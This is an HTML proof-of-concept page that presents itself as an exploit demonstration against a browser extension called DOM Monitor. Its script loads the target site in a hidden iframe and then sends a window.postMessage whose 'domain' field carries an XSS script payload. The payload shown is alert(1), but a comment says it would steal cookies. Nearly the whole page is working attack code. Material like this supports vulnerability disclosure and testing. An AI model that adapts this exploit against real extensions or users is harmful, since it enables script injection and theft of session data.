<!DOCTYPE html>
<html>
<head>
    <title>DOM Monitor Extension Exploit</title>
</head>
<body>
    <h1>DOM Monitor Extension Exploit Demonstration</h1>
    <p>This page demonstrates how an attacker could exploit the XSS vulnerability in the DOM Monitor extension.</p>
    
    <button id="start">Start Exploit</button>
    
    <script>
        document.getElementById('start').addEventListener('click', function() {
            // Create an invisible iframe to load the target page
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://app.dom-monitor.fr/'; // Target domain
            document.body.appendChild(iframe);
            
            // Wait for the iframe to load
            iframe.onload = function() {
                console.log('Target page loaded, sending exploit message...');
                
                // XSS payload that would steal cookies
                const xssPayload = '<script>alert(1)<\/script>';
                
                // Send message that will be processed by the extension
                window.postMessage({
                    action: "update_counts",
                    domain: xssPayload,  // The vulnerable field
                    counts: {
                        fetch: 1,
                        innerHTML: 1,
                        setAttribute: 1,
                        eval: 0
                    },
                    resourceCounts: {
                        script: 1,
                        img: 1,
                        stylesheet: 1,
                        font: 0,
                        other: 0
                    }
                }, '*');
                
                console.log('Exploit message sent');
            };
        });
    </script>
</body>
</html>
